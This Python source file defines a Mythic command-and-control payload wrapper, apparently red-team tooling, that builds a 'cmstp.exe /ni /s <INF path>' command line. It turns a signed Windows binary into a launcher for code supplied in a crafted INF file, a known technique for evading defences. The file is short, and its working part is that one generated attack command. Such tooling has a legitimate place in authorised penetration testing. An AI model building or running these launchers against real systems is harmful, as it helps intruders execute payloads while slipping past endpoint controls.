import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os


class cmd_cmstp_local_inf(PayloadType):
    name = "cmd_cmstp_local_inf"
    file_extension = "cmd"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    note = """Executes cmstp.exe to a INF file"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "cmd"
    agent_icon_path = agent_path / "agent_functions" / "cmd.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "binary",
            parameter_type=BuildParameterType.String,
            default_value="cmstp.exe",
            description="cmstp.exe binary path",
        ),
        BuildParameter(
            name = "inf_path",
            parameter_type=BuildParameterType.String,
            description="INF path",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            inf_path = self.get_parameter('inf_path')
            binary = self.get_parameter('binary')

            payload = "%s /ni /s %s" % (binary, inf_path)

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
